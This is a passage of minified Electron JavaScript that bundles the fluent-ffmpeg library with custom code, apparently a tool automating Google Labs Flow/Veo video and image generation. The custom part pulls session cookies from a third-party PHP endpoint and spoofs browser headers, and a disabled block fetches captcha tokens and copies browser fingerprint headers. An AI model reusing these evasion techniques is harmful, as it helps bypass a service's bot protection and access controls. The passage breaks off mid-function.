                        _.forEach(function (D) {
                          D in b || ((b[D] = {}), h.copy(g, b[D])),
                            (b[D].canDecode = !0);
                        });
                    }
                  }
                }),
                  E(null, (u.codecs = b));
              }
            );
          }),
        (m.availableEncoders = m.getAvailableEncoders =
          function (E) {
            if ("encoders" in u) return E(null, u.encoders);
            this._spawnFfmpeg(
              ["-encoders"],
              { captureStdout: !0, stdoutLines: 0 },
              function (y, p) {
                if (y) return E(y);
                var A = p.get(),
                  S = A.split(n),
                  b = {};
                S.forEach(function (R) {
                  var C = R.match(e);
                  C &&
                    C[7] !== "=" &&
                    (b[C[7]] = {
                      type: { V: "video", A: "audio", S: "subtitle" }[C[1]],
                      description: C[8],
                      frameMT: C[2] === "F",
                      sliceMT: C[3] === "S",
                      experimental: C[4] === "X",
                      drawHorizBand: C[5] === "B",
                      directRendering: C[6] === "D",
                    });
                }),
                  E(null, (u.encoders = b));
              }
            );
          }),
        (m.availableFormats = m.getAvailableFormats =
          function (E) {
            if ("formats" in u) return E(null, u.formats);
            this._spawnFfmpeg(
              ["-formats"],
              { captureStdout: !0, stdoutLines: 0 },
              function (y, p) {
                if (y) return E(y);
                var A = p.get(),
                  S = A.split(n),
                  b = {};
                S.forEach(function (R) {
                  var C = R.match(o);
                  C &&
                    C[3].split(",").forEach(function (v) {
                      v in b ||
                        (b[v] = {
                          description: C[4],
                          canDemux: !1,
                          canMux: !1,
                        }),
                        C[1] === "D" && (b[v].canDemux = !0),
                        C[2] === "E" && (b[v].canMux = !0);
                    });
                }),
                  E(null, (u.formats = b));
              }
            );
          }),
        (m._checkCapabilities = function (E) {
          var y = this;
          c.waterfall(
            [
              function (p) {
                y.availableFormats(p);
              },
              function (p, A) {
                var S;
                if (
                  ((S = y._outputs.reduce(function (b, R) {
                    var C = R.options.find("-f", 1);
                    return (
                      C && (!(C[0] in p) || !p[C[0]].canMux) && b.push(C), b
                    );
                  }, [])),
                    S.length === 1)
                )
                  return A(
                    new Error("Output format " + S[0] + " is not available")
                  );
                if (S.length > 1)
                  return A(
                    new Error(
                      "Output formats " + S.join(", ") + " are not available"
                    )
                  );
                if (
                  ((S = y._inputs.reduce(function (b, R) {
                    var C = R.options.find("-f", 1);
                    return (
                      C && (!(C[0] in p) || !p[C[0]].canDemux) && b.push(C[0]),
                      b
                    );
                  }, [])),
                    S.length === 1)
                )
                  return A(
                    new Error("Input format " + S[0] + " is not available")
                  );
                if (S.length > 1)
                  return A(
                    new Error(
                      "Input formats " + S.join(", ") + " are not available"
                    )
                  );
                A();
              },
              function (p) {
                y.availableEncoders(p);
              },
              function (p, A) {
                var S;
                if (
                  ((S = y._outputs.reduce(function (b, R) {
                    var C = R.audio.find("-acodec", 1);
                    return (
                      C &&
                      C[0] !== "copy" &&
                      (!(C[0] in p) || p[C[0]].type !== "audio") &&
                      b.push(C[0]),
                      b
                    );
                  }, [])),
                    S.length === 1)
                )
                  return A(
                    new Error("Audio codec " + S[0] + " is not available")
                  );
                if (S.length > 1)
                  return A(
                    new Error(
                      "Audio codecs " + S.join(", ") + " are not available"
                    )
                  );
                if (
                  ((S = y._outputs.reduce(function (b, R) {
                    var C = R.video.find("-vcodec", 1);
                    return (
                      C &&
                      C[0] !== "copy" &&
                      (!(C[0] in p) || p[C[0]].type !== "video") &&
                      b.push(C[0]),
                      b
                    );
                  }, [])),
                    S.length === 1)
                )
                  return A(
                    new Error("Video codec " + S[0] + " is not available")
                  );
                if (S.length > 1)
                  return A(
                    new Error(
                      "Video codecs " + S.join(", ") + " are not available"
                    )
                  );
                A();
              },
            ],
            E
          );
        });
    }),
    vo
  );
}
var wo, vl;
function jd() {
  if (vl) return wo;
  vl = 1;
  var a = Nt.spawn;
  function i(f) {
    return f.match(/^TAG:/);
  }
  function c(f) {
    return f.match(/^DISPOSITION:/);
  }
  function h(f) {
    var t = f.split(/\r\n|\r|\n/);
    t = t.filter(function (s) {
      return s.length > 0;
    });
    var r = { streams: [], format: {}, chapters: [] };
    function l(s) {
      for (var u = {}, m = t.shift(); typeof m < "u";) {
        if (m.toLowerCase() == "[/" + s + "]") return u;
        if (m.match(/^\[/)) {
          m = t.shift();
          continue;
        }
        var E = m.match(/^([^=]+)=(.*)$/);
        E &&
          (!E[1].match(/^TAG:/) && E[2].match(/^[0-9]+(\.[0-9]+)?$/)
            ? (u[E[1]] = Number(E[2]))
            : (u[E[1]] = E[2])),
          (m = t.shift());
      }
      return u;
    }
    for (var e = t.shift(); typeof e < "u";) {
      if (e.match(/^\[stream/i)) {
        var o = l("stream");
        r.streams.push(o);
      } else if (e.match(/^\[chapter/i)) {
        var n = l("chapter");
        r.chapters.push(n);
      } else e.toLowerCase() === "[format]" && (r.format = l("format"));
      e = t.shift();
    }
    return r;
  }
  return (
    (wo = function (f) {
      f.ffprobe = function () {
        var t,
          r = null,
          l = [],
          e,
          e = arguments[arguments.length - 1],
          o = !1;
        function n(s, u) {
          o || ((o = !0), e(s, u));
        }
        switch (arguments.length) {
          case 3:
            (r = arguments[0]), (l = arguments[1]);
            break;
          case 2:
            typeof arguments[0] == "number"
              ? (r = arguments[0])
              : Array.isArray(arguments[0]) && (l = arguments[0]);
            break;
        }
        if (r === null) {
          if (!this._currentInput) return n(new Error("No input specified"));
          t = this._currentInput;
        } else if (((t = this._inputs[r]), !t))
          return n(new Error("Invalid input index"));
        this._getFfprobePath(function (s, u) {
          if (s) return n(s);
          if (!u) return n(new Error("Cannot find ffprobe"));
          var m = "",
            E = !1,
            y = "",
            p = !1,
            A = t.isStream ? "pipe:0" : t.source,
            S = a(u, ["-show_streams", "-show_format"].concat(l, A), {
              windowsHide: !0,
            });
          t.isStream &&
            (S.stdin.on("error", function (v) {
              ["ECONNRESET", "EPIPE", "EOF"].indexOf(v.code) >= 0 || n(v);
            }),
              S.stdin.on("close", function () {
                t.source.pause(), t.source.unpipe(S.stdin);
              }),
              t.source.pipe(S.stdin)),
            S.on("error", e);
          var b = null;
          function R(v) {
            if ((v && (b = v), C && E && p)) {
              if (b)
                return (
                  y &&
                  (b.message +=
                    `
` + y),
                  n(b)
                );
              var w = h(m);
              [w.format].concat(w.streams).forEach(function (_) {
                if (_) {
                  var g = Object.keys(_).filter(i);
                  g.length &&
                    ((_.tags = _.tags || {}),
                      g.forEach(function (O) {
                        (_.tags[O.substr(4)] = _[O]), delete _[O];
                      }));
                  var D = Object.keys(_).filter(c);
                  D.length &&
                    ((_.disposition = _.disposition || {}),
                      D.forEach(function (O) {
                        (_.disposition[O.substr(12)] = _[O]), delete _[O];
                      }));
                }
              }),
                n(null, w);
            }
          }
          var C = !1;
          S.on("exit", function (v, w) {
            (C = !0),
              v
                ? R(new Error("ffprobe exited with code " + v))
                : w
                  ? R(new Error("ffprobe was killed with signal " + w))
                  : R();
          }),
            S.stdout.on("data", function (v) {
              m += v;
            }),
            S.stdout.on("close", function () {
              (E = !0), R();
            }),
            S.stderr.on("data", function (v) {
              y += v;
            }),
            S.stderr.on("close", function () {
              (p = !0), R();
            });
        });
      };
    }),
    wo
  );
}
var yo, wl;
function Hd() {
  if (wl) return yo;
  wl = 1;
  var a = be,
    i = ye,
    c = Ht.PassThrough,
    h = Bo(),
    f = pt();
  return (
    (yo = function (r) {
      (r.saveToFile = r.save =
        function (l) {
          return this.output(l).run(), this;
        }),
        (r.writeToStream =
          r.pipe =
          r.stream =
          function (l, e) {
            if ((l && !("writable" in l) && ((e = l), (l = void 0)), !l)) {
              if (process.version.match(/v0\.8\./))
                throw new Error(
                  "PassThrough stream is not supported on node v0.8"
                );
              l = new c();
            }
            return this.output(l, e).run(), l;
          }),
        (r.takeScreenshots =
          r.thumbnail =
          r.thumbnails =
          r.screenshot =
          r.screenshots =
          function (l, e) {
            var o = this,
              n = this._currentInput.source;
            if (
              ((l = l || { count: 1 }),
                typeof l == "number" && (l = { count: l }),
                "folder" in l || (l.folder = e || "."),
                "timestamps" in l && (l.timemarks = l.timestamps),
                !("timemarks" in l))
            ) {
              if (!l.count)
                throw new Error(
                  "Cannot take screenshots: neither a count nor a timemark list are specified"
                );
              var s = 100 / (1 + l.count);
              l.timemarks = [];
              for (var u = 0; u < l.count; u++)
                l.timemarks.push(s * (u + 1) + "%");
            }
            if ("size" in l) {
              var m = l.size.match(/^(\d+)x(\d+)$/),
                E = l.size.match(/^(\d+)x\?$/),
                y = l.size.match(/^\?x(\d+)$/),
                p = l.size.match(/^(\d+)%$/);
              if (!m && !E && !y && !p)
                throw new Error("Invalid size parameter: " + l.size);
            }
            var A;
            function S(b) {
              A
                ? b(null, A)
                : o.ffprobe(function (R, C) {
                  (A = C), b(R, C);
                });
            }
            return (
              h.waterfall(
                [
                  function (R) {
                    if (
                      l.timemarks.some(function (C) {
                        return ("" + C).match(/^[\d.]+%$/);
                      })
                    ) {
                      if (typeof n != "string")
                        return R(
                          new Error(
                            "Cannot compute screenshot timemarks with an input stream, please specify fixed timemarks"
                          )
                        );
                      S(function (C, v) {
                        if (C) R(C);
                        else {
                          var w = v.streams.reduce(
                            function (g, D) {
                              return D.codec_type === "video" &&
                                D.width * D.height > g.width * g.height
                                ? D
                                : g;
                            },
                            { width: 0, height: 0 }
                          );
                          if (w.width === 0)
                            return R(
                              new Error(
                                "No video stream in input, cannot take screenshots"
                              )
                            );
                          var _ = Number(w.duration);
                          if (
                            (isNaN(_) && (_ = Number(v.format.duration)),
                              isNaN(_))
                          )
                            return R(
                              new Error(
                                "Could not get input duration, please specify fixed timemarks"
                              )
                            );
                          (l.timemarks = l.timemarks.map(function (g) {
                            return ("" + g).match(/^([\d.]+)%$/)
                              ? (_ * parseFloat(g)) / 100
                              : g;
                          })),
                            R();
                        }
                      });
                    } else R();
                  },
                  function (R) {
                    (l.timemarks = l.timemarks
                      .map(function (C) {
                        return f.timemarkToSeconds(C);
                      })
                      .sort(function (C, v) {
                        return C - v;
                      })),
                      R();
                  },
                  function (R) {
                    var C = l.filename || "tn.png";
                    if (
                      (C.indexOf(".") === -1 && (C += ".png"),
                        l.timemarks.length > 1 && !C.match(/%(s|0*i)/))
                    ) {
                      var v = i.extname(C);
                      C = i.join(i.dirname(C), i.basename(C, v) + "_%i" + v);
                    }
                    R(null, C);
                  },
                  function (R, C) {
                    if (R.match(/%[bf]/)) {
                      if (typeof n != "string")
                        return C(
                          new Error(
                            "Cannot replace %f or %b when using an input stream"
                          )
                        );
                      R = R.replace(/%f/g, i.basename(n)).replace(
                        /%b/g,
                        i.basename(n, i.extname(n))
                      );
                    }
                    C(null, R);
                  },
                  function (R, C) {
                    if (R.match(/%[whr]/)) {
                      if (m) return C(null, R, m[1], m[2]);
                      S(function (v, w) {
                        if (v)
                          return C(
                            new Error(
                              "Could not determine video resolution to replace %w, %h or %r"
                            )
                          );
                        var _ = w.streams.reduce(
                          function (O, N) {
                            return N.codec_type === "video" &&
                              N.width * N.height > O.width * O.height
                              ? N
                              : O;
                          },
                          { width: 0, height: 0 }
                        );
                        if (_.width === 0)
                          return C(
                            new Error(
                              "No video stream in input, cannot replace %w, %h or %r"
                            )
                          );
                        var g = _.width,
                          D = _.height;
                        E
                          ? ((D = (D * Number(E[1])) / g), (g = Number(E[1])))
                          : y
                            ? ((g = (g * Number(y[1])) / D), (D = Number(y[1])))
                            : p &&
                            ((g = (g * Number(p[1])) / 100),
                              (D = (D * Number(p[1])) / 100)),
                          C(
                            null,
                            R,
                            Math.round(g / 2) * 2,
                            Math.round(D / 2) * 2
                          );
                      });
                    } else C(null, R, -1, -1);
                  },
                  function (R, C, v, w) {
                    (R = R.replace(/%r/g, "%wx%h")
                      .replace(/%w/g, C)
                      .replace(/%h/g, v)),
                      w(null, R);
                  },
                  function (R, C) {
                    var v = l.timemarks.map(function (w, _) {
                      return R.replace(/%s/g, f.timemarkToSeconds(w)).replace(
                        /%(0*)i/g,
                        function (g, D) {
                          var O = "" + (_ + 1);
                          return (
                            D.substr(
                              0,
                              Math.max(0, D.length + 1 - O.length)
                            ) + O
                          );
                        }
                      );
                    });
                    o.emit("filenames", v), C(null, v);
                  },
                  function (R, C) {
                    a.exists(l.folder, function (v) {
                      v
                        ? C(null, R)
                        : a.mkdir(l.folder, function (w) {
                          w ? C(w) : C(null, R);
                        });
                    });
                  },
                ],
                function (R, C) {
                  if (R) return o.emit("error", R);
                  var v = l.timemarks.length,
                    w,
                    _ = [(w = { filter: "split", options: v, outputs: [] })];
                  if ("size" in l) {
                    o.size(l.size);
                    var g = o._currentOutput.sizeFilters
                      .get()
                      .map(function (L, F) {
                        return (
                          F > 0 && (L.inputs = "size" + (F - 1)),
                          (L.outputs = "size" + F),
                          L
                        );
                      });
                    (w.inputs = "size" + (g.length - 1)),
                      (_ = g.concat(_)),
                      o._currentOutput.sizeFilters.clear();
                  }
                  for (var D = 0, O = 0; O < v; O++) {
                    var N = "screen" + O;
                    w.outputs.push(N),
                      O === 0 && ((D = l.timemarks[O]), o.seekInput(D)),
                      o.output(i.join(l.folder, C[O])).frames(1).map(N),
                      O > 0 && o.seek(l.timemarks[O] - D);
                  }
                  o.complexFilter(_), o.run();
                }
              ),
              this
            );
          }),
        (r.mergeToFile =
          r.concatenate =
          r.concat =
          function (l, e) {
            var o = this._inputs.filter(function (s) {
              return !s.isStream;
            })[0],
              n = this;
            return (
              this.ffprobe(this._inputs.indexOf(o), function (s, u) {
                if (s) return n.emit("error", s);
                var m = u.streams.some(function (y) {
                  return y.codec_type === "audio";
                }),
                  E = u.streams.some(function (y) {
                    return y.codec_type === "video";
                  });
                n.output(l, e)
                  .complexFilter({
                    filter: "concat",
                    options: {
                      n: n._inputs.length,
                      v: E ? 1 : 0,
                      a: m ? 1 : 0,
                    },
                  })
                  .run();
              }),
              this
            );
          });
    }),
    yo
  );
}
var Eo, yl;
function Gd() {
  if (yl) return Eo;
  yl = 1;
  var a = ye,
    i = Vr,
    c = Ro.EventEmitter,
    h = pt();
  function f(t, r) {
    if (!(this instanceof f)) return new f(t, r);
    c.call(this),
      typeof t == "object" && !("readable" in t)
        ? (r = t)
        : ((r = r || {}), (r.source = t)),
      (this._inputs = []),
      r.source && this.input(r.source),
      (this._outputs = []),
      this.output();
    var l = this;
    ["_global", "_complexFilters"].forEach(function (e) {
      l[e] = h.args();
    }),
      (r.stdoutLines = "stdoutLines" in r ? r.stdoutLines : 100),
      (r.presets = r.presets || r.preset || a.join(__dirname, "presets")),
      (r.niceness = r.niceness || r.priority || 0),
      (this.options = r),
      (this.logger = r.logger || {
        debug: function () { },
        info: function () { },
        warn: function () { },
        error: function () { },
      });
  }
  return (
    i.inherits(f, c),
    (Eo = f),
    (f.prototype.clone = function () {
      var t = new f(),
        r = this;
      return (
        (t.options = this.options),
        (t.logger = this.logger),
        (t._inputs = this._inputs.map(function (l) {
          return { source: l.source, options: l.options.clone() };
        })),
        "target" in this._outputs[0]
          ? ((t._outputs = []), t.output())
          : ((t._outputs = [(t._currentOutput = { flags: {} })]),
            [
              "audio",
              "audioFilters",
              "video",
              "videoFilters",
              "sizeFilters",
              "options",
            ].forEach(function (l) {
              t._currentOutput[l] = r._currentOutput[l].clone();
            }),
            this._currentOutput.sizeData &&
            ((t._currentOutput.sizeData = {}),
              h.copy(this._currentOutput.sizeData, t._currentOutput.sizeData)),
            h.copy(this._currentOutput.flags, t._currentOutput.flags)),
        ["_global", "_complexFilters"].forEach(function (l) {
          t[l] = r[l].clone();
        }),
        t
      );
    }),
    xd()(f.prototype),
    Nd()(f.prototype),
    Fd()(f.prototype),
    $d()(f.prototype),
    Ld()(f.prototype),
    Ud()(f.prototype),
    qd()(f.prototype),
    Md()(f.prototype),
    Bd()(f.prototype),
    (f.setFfmpegPath = function (t) {
      new f().setFfmpegPath(t);
    }),
    (f.setFfprobePath = function (t) {
      new f().setFfprobePath(t);
    }),
    (f.setFlvtoolPath = function (t) {
      new f().setFlvtoolPath(t);
    }),
    (f.availableFilters = f.getAvailableFilters =
      function (t) {
        new f().availableFilters(t);
      }),
    (f.availableCodecs = f.getAvailableCodecs =
      function (t) {
        new f().availableCodecs(t);
      }),
    (f.availableFormats = f.getAvailableFormats =
      function (t) {
        new f().availableFormats(t);
      }),
    (f.availableEncoders = f.getAvailableEncoders =
      function (t) {
        new f().availableEncoders(t);
      }),
    jd()(f.prototype),
    (f.ffprobe = function (t) {
      var r = new f(t);
      r.ffprobe.apply(r, Array.prototype.slice.call(arguments, 1));
    }),
    Hd()(f.prototype),
    Eo
  );
}
var _o, El;
function Vd() {
  return El || ((El = 1), (_o = Gd())), _o;
}
var Wd = Vd();
const jo = ef(Wd);

// --- TỰ ĐỘNG CẤU HÌNH ĐƯỜNG DẪN FFMPEG ĐÓNG GÓI ---
(function () {
  const path = require('path');
  const fs = require('fs');
  // Trong môi trường đóng gói (Packaged)
  let ffmpegExe = process.platform === "win32" ? "ffmpeg.exe" : "ffmpeg";
  let ffprobeExe = process.platform === "win32" ? "ffprobe.exe" : "ffprobe";

  let basePath = he.app.isPackaged ? path.dirname(he.app.getPath('exe')) : process.cwd();
  if (process.platform === "darwin" && he.app.isPackaged) {
    basePath = path.join(path.dirname(he.app.getPath('exe')), '..', 'MacOS');
  }

  const ffmpegPath = path.join(basePath, ffmpegExe);
  const ffprobePath = path.join(basePath, ffprobeExe);

  if (fs.existsSync(ffmpegPath)) {
    jo.setFfmpegPath(ffmpegPath);
  }
  if (fs.existsSync(ffprobePath)) {
    jo.setFfprobePath(ffprobePath);
  }
})();
// ------------------------------------------------

let $e = !1,
  Qe = !1;
// ===== [CANCELLABLE SLEEP] =====
global.currentAbortController = global.currentAbortController || null;

function isSessionStopped() {
  return !!($e || Qe || (global.currentAbortController && global.currentAbortController.signal.aborted));
}
global.isSessionStopped = isSessionStopped;

function cancellableSleep(ms) {
  return new Promise((resolve) => {
    if ($e || Qe) return resolve();
    const ctrl = global.currentAbortController;
    if (!ctrl || ctrl.signal.aborted) return resolve();
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      ctrl.signal.removeEventListener("abort", onAbort);
      resolve();
    };
    const onAbort = () => finish();
    const timer = setTimeout(finish, ms);
    ctrl.signal.addEventListener("abort", onAbort, { once: true });
  });
}

function newSessionAbortController() {
  $e = false;
  Qe = false;
  const old = global.currentAbortController;
  if (old) { try { old.abort(); } catch { } }
  const ctrl = new AbortController();
  global.currentAbortController = ctrl;
  return ctrl;
}

function abortCurrentSession() {
  $e = true;
  Qe = true;
  const ctrl = global.currentAbortController;
  if (ctrl && !ctrl.signal.aborted) {
    try { ctrl.abort(); } catch { }
  }
}
// ===== [END CANCELLABLE SLEEP] =====
const Zr = 3e3;
let xt = null,
  qe = null;
const So = process.env.VITE_DEV_SERVER_URL,
  To = !!So,
  Ao = new Map([
    ["https://tainguyenweb.com/apiveo/kinxcookie.php", "E001"],
    ["https://labs.google/fx/api/trpc/project.createProject", "E002"],
    /* [ĐÃ TẮT aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
    [
      "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoText",
      "E003",
    ],
    [
      "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
      "E004",
    ],
    ["https://aisandbox-pa.googleapis.com/v1:uploadUserImage", "E005"],
    [
      "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartAndEndImage",
      "E006",
    ],
    ["https://labs.google/fx/api/trpc/media.createOrUpdateWorkflow", "E007"],
    ["https://aisandbox-pa.googleapis.com/v1/whisk:generateImage", "E008"],
    ["https://aisandbox-pa.googleapis.com/v1/whisk:runImageRecipe", "E008"],
    ["https://labs.google/fx/api/trpc/backbone.uploadImage", "E007"],
    [
      "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartImage",
      "E009",
    ],
    */
  ]);
let uploadMutex = Promise.resolve();
let lastUploadTime = 0;

function isRateLimitedActionUrl(url) {
  if (!url || typeof url !== 'string') return false;
  return url.includes("upload") ||
    url.includes("GenerateVideo") ||
    url.includes("GenerateImages") ||
    url.includes("runImageRecipe");
}

console.log("[DEBUG] main.js loaded with We wrapper cache logic");
global.bananaFrontendUploadCache = global.bananaFrontendUploadCache || new Map();
async function We(a, argObj, isRetry = false) {
  if (a && typeof a === "object" && !isRetry && isSessionStopped()) {
    newSessionAbortController();
  }
  if (argObj && argObj.url && argObj.url.includes("uploadImage")) {
    console.log(`\n[DEBUG] We wrapper invoked! isRetry=${isRetry}, url=${argObj.url}`);
    console.log(`[DEBUG] typeof body=${typeof argObj?.options?.body}`);
  }

  if (!isRetry && argObj && argObj.url && argObj.url.includes("uploadImage") && argObj.options && argObj.options.body && typeof argObj.options.body === 'string') {
    try {
      const parsedBody = JSON.parse(argObj.options.body);
      if (parsedBody.imageBytes) {
        const mySuperUniqueCookieVar123 = (typeof argObj.cookie === 'object' && argObj.cookie) ? (argObj.cookie.value || "nocookie") : (argObj.cookie || "nocookie");
        const bytes = parsedBody.imageBytes;
        // Use a 1000 char sample as the key directly to avoid crypto dependency issues
        const sample = bytes.length > 2000 ? bytes.substring(0, 500) + bytes.substring(bytes.length - 500) : bytes;
        const cacheKey = mySuperUniqueCookieVar123.substring(0, 20) + "_" + sample;

        console.log(`[DEBUG] CACHE KEY: ${cacheKey}. Current size: ${global.bananaFrontendUploadCache.size}`);

        if (global.bananaFrontendUploadCache.has(cacheKey)) {
          console.log(`[DEBUG] CACHE HIT!`);
          return await global.bananaFrontendUploadCache.get(cacheKey);
        }

        console.log(`[DEBUG] CACHE MISS. Proceeding with _We...`);
        const uploadPromise = _We(a, argObj, isRetry);
        global.bananaFrontendUploadCache.set(cacheKey, uploadPromise);

        try {
          const res = await uploadPromise;
          console.log(`[DEBUG] _We resolved successfully for cacheKey ${cacheKey}`);
          return res;
        } catch (e) {
          console.log(`[DEBUG] _We threw error for cacheKey ${cacheKey}`, e.message);
          global.bananaFrontendUploadCache.delete(cacheKey);
          throw e;
        }
      } else {
        console.log(`[DEBUG] No imageBytes in parsedBody!`);
      }
    } catch (e) {
      console.error("[DEBUG] Lỗi khi kiểm tra cache uploadImage:", e);
    }
  }
  return await _We(a, argObj, isRetry);
}

async function _We(a, argObj, isRetry = false) {
  if (isSessionStopped()) throw new Error("SESSION_STOPPED");
  const isAction = isRateLimitedActionUrl(argObj?.url) && !isRetry;
  let resolveLock = null;

  if (isAction) {
    const currentLock = uploadMutex;
    uploadMutex = new Promise(resolve => {
      resolveLock = resolve;
    });

    await currentLock;
    if (isSessionStopped()) {
      if (resolveLock) resolveLock();
      throw new Error("SESSION_STOPPED");
    }

    const now = Date.now();
    const waitTime = Math.max(0, 10000 - (now - lastUploadTime));
    if (waitTime > 0) {
      const waitSec = Math.ceil(waitTime / 1000);
      const msg = `Đang xử lý ${waitSec}s`;
      const win = he.BrowserWindow.getAllWindows()[0];
      if (win && !win.isDestroyed() && !isSessionStopped()) {
        win.webContents.send("browser:log", {
          promptId: null,
          message: msg,
          status: "processing"
        });
      }
      console.log(msg);
      await cancellableSleep(waitTime);
      if (isSessionStopped()) {
        if (resolveLock) resolveLock();
        throw new Error("SESSION_STOPPED");
      }
    }
    lastUploadTime = Date.now();
  }

  try {
    if (isSessionStopped()) throw new Error("SESSION_STOPPED");
    return await WeInternal(a, argObj, isRetry);
  } finally {
    if (resolveLock) {
      resolveLock();
    }
  }
}


async function WeInternal(a, { url: i, cookie: c, options: h }, isRetry = false) {
  if (isSessionStopped()) throw new Error("SESSION_STOPPED");

  if (i && i.includes("kinxcookie.php")) {
    if (/[?&](401|429)\b/.test(i)) {
      if (typeof flowCookieCache !== "undefined" && flowCookieCache.clear) flowCookieCache.clear();
      if (typeof flowSessionCache !== "undefined" && flowSessionCache.clear) flowSessionCache.clear();
      if (global.bananaFrontendUploadCache && global.bananaFrontendUploadCache.clear) global.bananaFrontendUploadCache.clear();
      global.lastValidKinxCookieResponse = null;
      console.log(`[FlowRPC] Phát hiện gọi ${i.split("/").pop()} -> Đã xóa flowCookieCache, flowSessionCache & bananaFrontendUploadCache để nhận cookie mới.`);
    } else if (global.lastValidKinxCookieResponse && global.lastValidKinxCookieResponse.expiry > Date.now()) {
      return global.lastValidKinxCookieResponse.data;
    }
  }

  if (i && i.includes("getMediaUrlRedirect")) {
    const fetchFn = global.fetch || require("node-fetch");
    let cVal = "";
    if (typeof c !== 'undefined' && c && c.value) cVal = c.value;
    else if (typeof c !== 'undefined' && typeof c === 'string') cVal = c;
    else if (typeof c !== 'undefined' && c && c.cookie && c.cookie.value) cVal = c.cookie.value;

    const redirectRes = await flowMediaRedirectResponse(i, cVal);
    if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
      return { redirectUrl: redirectRes.headers.get("location") };
    } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
      return { redirectUrl: redirectRes.url };
    } else {
      try {
        const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
        const signed = await fetchFlowMediaSignedUrl(i, cValStr);
        if (signed) { console.log("[Redirect] as29s fallback lấy URL:", signed); return { redirectUrl: signed }; }
      } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
    }
    return { redirectUrl: null };
  }

  // [FLOW VIDEO] Tạo video qua flow.google.com (CHỈ DÙNG FLOW API)
  if (i && /video:batchAsyncGenerateVideo/.test(i)) {
    const flowRes = await flowTryGenerateVideo(i, c, h && h.body);
    if (flowRes) return flowRes;
    throw new Error("Không thể tạo video qua Flow API.");
  }

  // [FLOW IMAGE UPLOAD] Upload ảnh qua flow.google.com (maseQ) (CHỈ DÙNG FLOW API)
  if (i && /upload(User)?Image/i.test(i)) {
    const flowUploadRes = await flowTryUploadImage(i, c, h && h.body);
    if (flowUploadRes) return flowUploadRes;
    throw new Error("Không thể upload ảnh qua Flow API (maseQ).");
  }

  // [FLOW IMAGE GENERATION] Tạo ảnh qua flow.google.com (ogiZ0b) (CHỈ DÙNG FLOW API)
  if (i && (/flowMedia:batchGenerateImages|whisk:generateImage|whisk:runImageRecipe/.test(i))) {
    const flowImgRes = await flowTryGenerateImage(i, c, h && h.body);
    if (flowImgRes) return flowImgRes;
    throw new Error("Không thể tạo ảnh qua Flow API (ogiZ0b).");
  }

  // [FLOW VIDEO] Kiểm tra trạng thái video tạo qua Flow & lấy URL tải qua as29s (CHỈ DÙNG FLOW API)
  if (i && i.includes("batchCheckAsyncVideoGenerationStatus")) {
    const flowStatusRes = await flowTryCheckVideoStatus(c, h && h.body);
    if (flowStatusRes) return flowStatusRes;
    throw new Error("Không thể kiểm tra trạng thái video qua Flow API.");
  }

  // Chặn mọi request còn sót lại gọi tới aisandbox-pa.googleapis.com
  // if (i && i.includes("aisandbox-pa.googleapis.com")) { ... }
  if (i && i.includes("aisandbox" + "-pa.googleapis.com")) {
    throw new Error("API aisandbox đã bị tắt, chỉ sử dụng Flow API.");
  }

  try {
    const f = new URL(i);
    let t = {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
      Origin: "https://labs.google",
      Referer: "https://labs.google/",
      ...h.headers,
    };

    /* [ĐÃ TẮT aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
    // --- [BẮT ĐẦU] TỰ ĐỘNG THÊM CAPTCHA CHO CÁC API VEO/GOOGLE ---
    if (i.includes("flowMedia:batchGenerateImages") || i.includes("aisandbox-pa.googleapis.com")) {
      const isImageApi = i.includes("uploadUserImage") || i.includes("flowMedia:batchGenerateImages");
      const action = isImageApi ? "IMAGE_GENERATION" : "VIDEO_GENERATION";

      // console.log(`[Fetch] Phát hiện API cần Captcha: ${i.split('/').pop()}, đang lấy (Action: ${action})...`);

      // 1. Lấy Token với Action phù hợp (Extract ThreadId ổn định hơn)
      let bodyData = h.body;
      if (typeof h.body === "string") {
        try { bodyData = JSON.parse(h.body); } catch (e) { }
      }
      const threadId = bodyData?.clientContext?.sessionId || bodyData?.sessionId || "default";

      const cookieString = (c && c.value) ? c.value : null;
      let captchaData = null;
      if (!i.includes("batchCheckAsyncVideoGenerationStatus") && !i.includes("uploadImage")) {
        captchaData = await getVeoCaptchaToken(action, false, threadId, cookieString);
      }
      const captchaToken = (captchaData && typeof captchaData === "object") ? captchaData.token : (typeof captchaData === "string" ? captchaData : null);

      if (captchaToken) {
        // SYNC FINGERPRINT HEADERS
        if (captchaData && typeof captchaData === "object" && captchaData.fingerprint) {
          const fp = captchaData.fingerprint;
          t["User-Agent"] = fp.ua;
          if (fp.brands) {
            t["sec-ch-ua"] = fp.brands.map(b => `"${b.brand}";v="${b.version}"`).join(", ");
            t["sec-ch-ua-mobile"] = fp.mobile ? "?1" : "?0";
            t["sec-ch-ua-platform"] = `"${fp.platform}"`;
          } else {
            delete t["sec-ch-ua"];
            delete t["sec-ch-ua-mobile"];
            delete t["sec-ch-ua-platform"];
          }
          t["x-client-data"] = fp.clientData;
          t["x-browser-validation"] = fp.browserValidation;
          t["Accept-Language"] = "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7";
        } else {
          // Fallback legacy
          t["User-Agent"] = (captchaData && captchaData.userAgent) ? captchaData.userAgent : t["User-Agent"];
          t["sec-ch-ua"] = `"Not/A)Brand";v="99", "Chromium";v="151", "Google Chrome";v="151"`;
          t["sec-ch-ua-mobile"] = "?0";
          t["sec-ch-ua-platform"] = '"Windows"';
        }

        t["content-type"] = "text/plain;charset=UTF-8";
        t["Referer"] = "https://labs.google/";
        t["Origin"] = "https://labs.google";
        t["sec-fetch-dest"] = "empty";
        t["sec-fetch-mode"] = "cors";
        t["sec-fetch-site"] = "cross-site";
        t["x-browser-channel"] = "stable";
